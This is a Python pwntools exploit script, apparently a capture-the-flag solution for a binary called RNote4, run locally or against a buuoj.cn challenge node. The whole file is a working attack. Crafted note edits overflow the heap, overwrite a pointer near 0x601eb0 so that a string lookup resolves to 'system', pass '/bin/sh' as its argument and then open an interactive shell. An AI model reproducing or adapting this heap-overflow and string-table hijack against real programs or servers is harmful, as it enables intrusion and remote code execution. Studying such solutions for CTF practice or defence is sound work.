#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./RNote4')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./RNote4')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',29270)
			elf=ELF('./RNote4')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

	

		def add(cont):
			io.send(p8(1))
			io.send(p8(len(cont)))
			io.send(cont)

		def edit(idx, cont):
			io.send(p8(2))
			io.send(p8(idx))
			io.send(p8(len(cont)))
			io.send(cont)

		def delete(idx):
			io.send(p8(3))
			io.send(p8(idx))
			

		add('a'*18)
		add('a'*18)
		edit(0,'a'*0x18+p64(0x21)+p64(0x30)+p64(0x601eb0))
		edit(1,p64(0x602100))
		edit(0,'/bin/sh\x00'+'a'*0x10+p64(0x21)+p64(0x30)+p64(0x602100))
		edit(1,'a'*0x5f+'system\x00')
		delete(0)

		
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue